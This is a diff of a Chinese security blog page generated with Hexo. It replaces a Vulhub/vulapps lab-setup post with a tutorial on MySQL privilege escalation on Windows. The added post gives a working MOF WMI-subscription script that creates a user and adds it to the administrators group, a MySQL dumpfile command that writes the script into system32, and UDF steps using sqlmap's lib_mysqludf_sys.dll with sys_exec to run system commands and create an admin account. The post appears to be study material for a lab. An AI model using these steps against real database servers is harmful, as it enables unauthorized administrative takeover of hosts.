@@ -4,10 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Vulhub vulapps漏洞环境搭建, god_13">
-    <meta name="description" content="Vulhub简介Vulhub是一个比较全面的漏洞集合，收集了近年来许多的重要漏洞，以开源的形式呈现，以docker的形式进行环境配置，提供了更简单的漏洞复现，只需要简单的命令即可实现漏洞复现。
-Vulhub下载地址：
-https://git">
+    <meta name="keywords" content="mysql MOF UDF 反弹端口提权, god_13">
+    <meta name="description" content="MOF提权关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行
+脚本
+#">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +15,7 @@ https://git">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Vulhub vulapps漏洞环境搭建 | god_13</title>
+    <title>mysql MOF UDF 反弹端口提权 | god_13</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -259,13 +259,13 @@ https://git">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Vulhub vulapps漏洞环境搭建
+                        mysql MOF UDF 反弹端口提权
                     </div>
                 </div>
             </div>
@@ -376,8 +376,8 @@ https://git">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞复现/" target="_blank">
-                                <span class="chip bg-color">漏洞复现</span>
+                            <a href="/tags/提权/" target="_blank">
+                                <span class="chip bg-color">提权</span>
                             </a>
                         
                     </div>
@@ -391,21 +391,21 @@ https://git">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-07-11
+                    2019-07-16
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        328
+                        783
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        1 Min
+                        3 Min
                     </div>
                     
                 
@@ -421,30 +421,53 @@ https://git">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Vulhub简介"><a href="#Vulhub简介" class="headerlink" title="Vulhub简介"></a>Vulhub简介</h2><p>Vulhub是一个比较全面的漏洞集合，收集了近年来许多的重要漏洞，以开源的形式呈现，以docker的形式进行环境配置，提供了更简单的漏洞复现，只需要简单的命令即可实现漏洞复现。</p>
-<h2 id="Vulhub下载"><a href="#Vulhub下载" class="headerlink" title="Vulhub下载"></a>Vulhub下载</h2><p>地址：</p>
-<pre><code>https://github.com/vulhub/vulhub
-</code></pre><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>安装docker的命令</p>
-<pre><code>apt-get install docker.io
-</code></pre><h2 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h2><p>命令</p>
-<pre><code>apt  install docker-compose
-</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>service docker start
+                <h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
+<p>脚本</p>
+<pre><code>#添加admin用户
+#pragma namespace(“\\\\.\\root\\subscription”)
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = “Root\\Cimv2”;
+Name = “filtP2”;
+Query = “Select * From __InstanceModificationEvent “
+“Where TargetInstance Isa \”Win32_LocalTime\” “
+“And TargetInstance.Second = 5”;
+QueryLanguage = “WQL”;
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = “consPCSV2”;
+ScriptingEngine = “JScript”;
+ScriptText =
+“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user dvsx 123456 /add\”)“;
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};
+</code></pre><p>想要进一步提权的话，只需要更改一条语句</p>
+<pre><code>net.exe localgroup administrators dvsx /add
+</code></pre><p>接下来需要利用mysql语句执行添加的命令</p>
+<pre><code>select load_file(“C:\RECYCLER\1.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof”
+</code></pre><p>前提是已经拥有mysql的root权限</p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF，user defined function,即用户自定义函数，用户可以通过自己添加函数对mysql进行功能扩充，文件后缀为.dll</p>
+<h3 id="udf提权原理"><a href="#udf提权原理" class="headerlink" title="udf提权原理"></a>udf提权原理</h3><p>通过添加用户自定义函数导出dll，然后在mysql中使用用户自定义函数以高权限账号执行命令，添加账号进行提权。<br>当 MySQL&lt; 5.2 版本时，将 .dll 文件导入到 c:\windows 或者c:\windows\system32 目录下。<br>当 MySQL&gt; 5.2 版本时，将 .dl l文件导入到 C:\Program Files\MySQL\lib\plugin 目录下。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>和MOF提权一样，我们需要先获得低一点的权限，这里环境是windows2003<br>查看mysql的版本</p>
+<pre><code>select version();
+</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/1.PNG" alt=""><br>发现是5.5.53版本，所以需要自己创建plugin文件夹来存放dll文件<br>dll文件是怎么生成的呢？可以从SQLmap那里获取，因为运行SQLmap的时候需要用到一些函数。就在<strong>sqlmap/udf/mysql/windows</strong>目录下，里面有32位和64位，注意：这里的位数是mysql的位数，并不是对方系统的位数。查看自己mysql的位数的命令</p>
+<pre><code>show variables like &#39;%version_%&#39;;
+</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/2.PNG" alt=""><br>发现是32位的，这一步一定不能少，直接决定之后能不能复现成功。<br>还有一个需要注意的是，sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中，只要进入到相应的目录运行脚本就可以了<br><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/3.PNG" alt=""><br>然后将生成的dll文件复制到mysql的/lib/plugin目录下，执行</p>
+<pre><code>create function cmdshell returns string soname &quot;lib_mysqludf_sys.dll&quot;;
+</code></pre><p>发现是会报错的，因为我们的dll文件里并没有cmdshell这个函数，所以我们要先查看dll文件里都有哪些函数，用winhex打开dll文件，发现文件末尾有一些函数<br><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/4.PNG" alt=""><br>我们使用sys_exec函数</p>
+<pre><code>create function sys_exec returns string soname &quot;lib_mysqludf_sys.dll&quot;
+</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/5.PNG" alt=""><br>执行成功，我们可以实验一下，去执行这个函数</p>
+<pre><code>select sys_exec(&quot;calc&quot;);
+</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/6.PNG" alt=""><br>成功弹出了计算器。<br><strong>添加用户并提升到管理员权限</strong></p>
+<pre><code>select sys_exec(&quot;net user dvsx 111111 /add&quot;);
+select sys_exec(&quot;net localgroup administrators dvsx /add&quot;)
+</code></pre><h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><p><strong>sys_exec():执行系统命令，无返回值</strong><br><strong>sys_eval():也是执行系统命令，但是执行完之后会有返回值</strong></p>
 
-cd vulhub/weblogic/CVE-2018-2894(以这一漏洞为例)
-
-docker-compose up -d(开始搭建环境)
-</code></pre><h2 id="查看docker进程"><a href="#查看docker进程" class="headerlink" title="查看docker进程"></a>查看docker进程</h2><pre><code>docker ps
-</code></pre><p><img src="/2019/07/11/vulhub-lou-dong-huan-jing-da-jian/1.PNG" alt=""><br>发现是在7001端口，那就先ifconfig查看下ip，再去访问网站就行了</p>
-<h2 id="结束docker进程"><a href="#结束docker进程" class="headerlink" title="结束docker进程"></a>结束docker进程</h2><pre><code>docker-compose down
-</code></pre><h2 id="进入docker容器"><a href="#进入docker容器" class="headerlink" title="进入docker容器"></a>进入docker容器</h2><pre><code>docker exec -it docker_name bin/bash
-</code></pre><p><img src="/2019/07/11/vulhub-lou-dong-huan-jing-da-jian/2.PNG" alt=""></p>
-<h2 id="vulapps简介"><a href="#vulapps简介" class="headerlink" title="vulapps简介"></a>vulapps简介</h2><p>和vulhub一样，都是github上的项目，上面收集了各种漏洞环境，统一采用的是dockerfile的形式，使用的时候需要查看相应漏洞的README文件，以 Struts2 S2-037 漏洞环境为例：<br>1.获取镜像</p>
-<pre><code>docker pull medicean/vulapps:s_struts2_s2-037
-</code></pre><p>2.创建并启动容器</p>
-<pre><code>docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-037
-</code></pre><p>访问 <a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a> 即可访问启动好的 s2-037 环境.不同的环境端口设置可能不一样，根据对应的README文件来操作就行<br>3.终止一个容器</p>
-<pre><code>docker stop docker_name
-</code></pre>
             </div>
             <hr>
 
@@ -599,9 +622,9 @@ docker-compose up -d(开始搭建环境)
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《Vulhub vulapps漏洞环境搭建》
+                    《mysql MOF UDF 反弹端口提权》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/11/vulhub-lou-dong-huan-jing-da-jian/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -664,27 +687,30 @@ docker-compose up -d(开始搭建环境)
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2019/07/11/weblogic-ren-yi-wen-jian-shang-chuan-lou-dong-cve-2018-2894/">
+                <a href="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Weblogic 任意文件上传漏洞（CVE-2018-2894）">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="mysql MOF UDF 反弹端口提权">
                         
-                        <span class="card-title">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span>
+                        <span class="card-title">mysql MOF UDF 反弹端口提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言影响的版本：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。受到影响的页面为/ws_utc/config.do和ws_utc/begin.do利用该漏洞，可以上传
+                            MOF提权关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行
+脚本
+#
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -693,11 +719,12 @@ docker-compose up -d(开始搭建环境)
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞复现/" target="_blank">
-                        <span class="chip bg-color">漏洞复现</span>
+                    <a href="/tags/提权/" target="_blank">
+                        <span class="chip bg-color">提权</span>
                     </a>
                     
                 </div>
@@ -711,24 +738,25 @@ docker-compose up -d(开始搭建环境)
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/11/ubuntu-huan-yuan/">
+                <a href="/2019/07/15/shen-fen-ren-zheng-rao-guo-lou-dong-cve-2012-2122/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ubuntu 换源">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="身份认证绕过漏洞(CVE-2012-2122)">
                         
-                        <span class="card-title">ubuntu 换源</span>
+                        <span class="card-title">身份认证绕过漏洞(CVE-2012-2122)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言安装好ubuntu系统后，默认的软件更新源是国外的，在国内使用速度很慢，用”apt install xxx”安装软件时可能出现”网络不可达”、”你的网络需要认证吗”、”无法定位软件包”等错误，所以我们需要更换成国内的源，这样才能正常安装
+                            前言当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。
+这个缺陷的根源在于memcmp()函数总是返回-128到127（
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-11
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-15
                             </span>
                         <span class="publish-author">
                             
@@ -741,8 +769,8 @@ docker-compose up -d(开始搭建环境)
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/换源/" target="_blank">
-                        <span class="chip bg-color">换源</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
